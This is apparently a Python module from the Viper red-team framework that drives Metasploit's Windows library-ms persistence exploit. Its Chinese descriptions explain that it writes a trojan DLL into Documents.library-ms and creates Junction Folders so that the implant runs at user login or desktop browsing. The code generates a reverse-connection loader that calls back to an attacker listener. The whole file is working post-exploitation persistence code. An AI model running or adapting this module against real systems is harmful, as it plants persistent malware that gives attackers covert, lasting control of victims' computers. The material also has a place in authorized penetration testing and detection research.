# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "Windows Library-ms持久化"
    DESC = "木马dll文件写入到Documents.library-ms配置文件中并新建Junction Folders\n" \
           "当用户登录或浏览桌面时生效.\n" \
           "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."
    MODULETYPE = TAG2CH.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = [""]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/rqqo3g"]
    REFERENCES = ["https://blog.f-secure.com/abusing-windows-library-files-for-persistence/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
        OptionFileEnum(ext=['exe', 'EXE'], required=False),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_library_ms"


    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Meterpreter类型的Session"

        if 'windows' not in self.get_handler_payload().lower():
            return False, "选择handler错误,请选择windows平台的监听"
        self.set_payload_by_handler()

        filepath = self.get_fileoption_filepath(msf=True)
        if filepath is None:  # 根据监听进行持久化
            exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_BASE")
        else:
            Notice.send_info("使用自定义的loader进行持久化")
            exe_filepath = filepath

        self.set_msf_option("EXE::Custom", exe_filepath)
        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("模块执行成功")
            self.log_good("DLL路径: {}\n用户下次登录时或浏览桌面时生效".format(data))
            self.cache_handler()
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
